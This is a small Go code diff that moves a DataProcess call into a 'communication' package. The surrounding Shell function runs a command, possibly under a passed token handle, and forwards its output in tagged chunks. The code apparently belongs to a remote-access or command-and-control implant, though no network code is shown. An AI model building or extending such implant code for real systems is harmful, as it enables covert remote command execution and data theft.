@@ -6,6 +6,7 @@ import (
 	"bytes"
 	"errors"
 	"fmt"
+	"main/communication"
 	"main/config"
 	"os"
 	"os/exec"
@@ -37,14 +38,14 @@ func Shell(path string, args []byte, Token uintptr) ([]byte, error) {
 	time.Sleep(500 * time.Millisecond)
 	buf = make([]byte, 1024*50)
 	count, err = stdout.Read(buf)
-	DataProcess(0, buf[:count])
+	communication.DataProcess(0, buf[:count])
 	for {
 		buf = make([]byte, 1024*50)
 		count, err = stdout.Read(buf)
 		if err != nil {
 			break
 		}
-		DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
+		communication.DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
 		time.Sleep(config.CommandReadTime)
 	}
 
